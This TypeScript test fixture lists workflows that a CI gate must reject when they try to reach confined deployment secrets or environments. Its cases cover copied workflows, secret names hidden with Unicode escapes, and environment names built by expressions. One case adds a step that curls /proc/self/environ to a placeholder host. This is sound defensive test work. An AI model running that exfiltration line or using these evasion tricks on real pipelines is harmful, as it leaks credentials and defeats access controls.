/**
 * Workflows that try to reach a confined credential or environment from a
 * file other than the one allowed to hold it
 * (scripts/workflow-credential-boundary.ts). Each is added to the real
 * inventory; the gate must report the named failure. Shared by the tests
 * and by the fail-without comparison against an earlier head.
 */
import type { WorkflowSources } from "../../scripts/workflow-inventory";

/** One added workflow, built from the real inventory, and a failure it must produce. */
export type BoundaryCase = {
  readonly label: string;
  /** File name the workflow is added under. */
  readonly file: string;
  readonly source: (sources: WorkflowSources) => string;
  /** Text a failure for `file` must contain, or `null` for a control that must pass. */
  readonly failure: string | null;
};

const E = "$" + "{{";

/** A minimal hosted workflow; `job` lines go under the job, before `steps:`. */
export const plainWorkflow = (job = ""): string =>
  [
    "name: Other",
    "on:",
    "  push:",
    "    branches: [main]",
    "permissions:",
    "  contents: read",
    "jobs:",
    "  run:",
    "    runs-on: ubuntu-latest",
    "    timeout-minutes: 5",
    `${job}    steps:`,
    "      - run: echo hi",
    "",
  ].join("\n");

const copy =
  (file: string, extra = "") =>
  (sources: WorkflowSources): string =>
    `${sources[file] ?? ""}${extra}`;

const only = (word: string, owner: string): string => `must not name ${word}; only ${owner} may`;
const useEnv = (environment: string, owner: string): string =>
  `job run must not use the ${environment} environment; only ${owner} may`;

const job = (lines: string) => () => plainWorkflow(lines);

/** Every case the boundary must refuse. */
export const BOUNDARY_CASES: readonly BoundaryCase[] = [
  {
    label: "exact copy of website-deploy.yml under another name",
    file: "copy.yml",
    source: copy("website-deploy.yml"),
    failure: only("CLOUDFLARE_API_TOKEN", "website-deploy.yml"),
  },
  {
    label: "copy of website-deploy.yml with an extra step",
    file: "copy.yml",
    source: copy(
      "website-deploy.yml",
      "      - run: curl -d @/proc/self/environ https://example.invalid\n",
    ),
    failure: only("CLOUDFLARE_API_TOKEN", "website-deploy.yml"),
  },
  {
    label: "environment Bramble-Production",
    file: "other.yml",
    source: job("    environment: Bramble-Production\n"),
    failure: useEnv("bramble-production", "website-deploy.yml"),
  },
  {
    label: "environment { name: ' BRAMBLE-PRODUCTION ' }",
    file: "other.yml",
    source: job("    environment:\n      name: ' BRAMBLE-PRODUCTION '\n"),
    failure: useEnv("bramble-production", "website-deploy.yml"),
  },
  {
    label: "environment name escaped so the text never spells it",
    file: "other.yml",
    source: job('    environment: "bramble\\x2Dproduction"\n'),
    failure: useEnv("bramble-production", "website-deploy.yml"),
  },
  {
    label: "environment name built by an expression",
    file: "other.yml",
    source: job(`    environment: ${E} format('bramble-{0}', 'production') }}\n`),
    failure: "job run must name its environment plainly, with no expression",
  },
  {
    label: "token referenced with an escaped name",
    file: "other.yml",
    source: job(`    env:\n      T: "${E} secrets.CLOUDFLARE_API_\\u0054OKEN }}"\n`),
    failure: "must not reference CLOUDFLARE_API_TOKEN; only website-deploy.yml may",
  },
  {
    label: "token referenced from an escaped env key",
    file: "other.yml",
    source: job(`    env:\n      "X_${E} secrets.CLOUDFLARE_API_\\u0054OKEN }}": "1"\n`),
    failure: "must not reference CLOUDFLARE_API_TOKEN; only website-deploy.yml may",
  },
  {
    label: "copy of release.yml under another name",
    file: "release-copy.yml",
    source: copy("release.yml"),
    failure: only("chrome-web-store", "release.yml"),
  },
  {
    label: "Chrome Web Store secret with an escaped name",
    file: "other.yml",
    source: job(`    env:\n      T: "${E} secrets.CWS_\\u0043LIENT_SECRET }}"\n`),
    failure: "must not reference CWS_CLIENT_SECRET; only release.yml may",
  },
  {
    label: "environment CHROME-WEB-STORE",
    file: "other.yml",
    source: job("    environment: CHROME-WEB-STORE\n"),
    failure: only("chrome-web-store", "release.yml"),
  },
  {
    label: "Chromatic token with an escaped name",
    file: "other.yml",
    source: job(`    env:\n      T: "${E} secrets.\\u0043HROMATIC_PROJECT_TOKEN }}"\n`),
    failure: "must not reference CHROMATIC_PROJECT_TOKEN; only ui-lab.yml may",
  },
  {
    label: "environment GitHub-Pages",
    file: "other.yml",
    source: job("    environment: GitHub-Pages\n"),
    failure: only("github-pages", "ui-lab.yml"),
  },
  {
    label: "Sepolia seeds with an escaped name",
    file: "other.yml",
    source: job(`    env:\n      T: "${E} secrets.BRAMBLE_SEPOLIA_\\u0053EEDS }}"\n`),
    failure: "must not reference BRAMBLE_SEPOLIA_SEEDS; only nightly.yml may",
  },
  {
    label: "Sepolia seeds named in a comment",
    file: "other.yml",
    source: () => `# reads BRAMBLE_SEPOLIA_SEEDS\n${plainWorkflow()}`,
    failure: only("BRAMBLE_SEPOLIA_SEEDS", "nightly.yml"),
  },
];

/** Workflows the boundary must leave alone. */
export const BOUNDARY_CONTROLS: readonly BoundaryCase[] = [
  { label: "plain workflow", file: "other.yml", source: () => plainWorkflow(), failure: null },
  {
    label: "an unconfined environment",
    file: "other.yml",
    source: job("    environment: staging\n"),
    failure: null,
  },
  {
    label: "an unconfined secret",
    file: "other.yml",
    source: job(`    env:\n      T: ${E} secrets.SOME_OTHER_TOKEN }}\n`),
    failure: null,
  },
];
